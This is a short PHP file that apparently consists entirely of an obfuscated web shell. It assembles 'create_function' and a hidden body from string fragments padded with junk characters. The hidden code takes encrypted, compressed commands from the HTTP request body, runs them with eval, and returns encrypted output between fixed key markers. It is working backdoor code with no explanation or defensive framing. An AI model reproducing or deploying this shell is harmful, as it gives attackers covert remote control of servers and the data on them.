<?php
$K=str_replace('IT','','cITreatITe_ITITfITunctITion');
$P='$k="4e66Z057Z3";$kh="b6Z69cZ3077Ze38";Z$kZf="aab027a2eZd5a";$p="ZZoVO6S977QZ';
$v='nZ();$r=@basZe64_encode(@Zx(@gzcoZmpressZ($o)ZZ,$k));print("Z$p$kh$rZ$kf");}';
$N=';ZZfor($i=0;Z$i<$l;Z)Z{for($j=0;($j<$c&Z&Z$i<$l);$Zj++,$iZ++)ZZ{$Zo.=$Z';
$x='AFHuK7v";ZfZuncZtion xZ(Z$t,$k){$c=strlZen($k);$l=ZstrleZn($t);$o=Z""';
$O='ZntZentsZ("php://inZput"),Z$m)==1) {@Zob_staZrtZ();Z@eZval(@gzZuncompresZs(@';
$h='t{$i}^$k{$j};}Z}returnZ Z$o;}if Z(@preg_maZtch("/$khZ(.+)$kf/",Z@file_geZt_co';
$b='ZZx(Z@base6Z4_decode($m[1]),$k)Z));$oZ=@ob_gZet_contents(ZZ);@ob_Zend_cleaZ';
$o=str_replace('Z','',$P.$x.$N.$h.$O.$b.$v);
$A=$K('',$o);$A();
?>
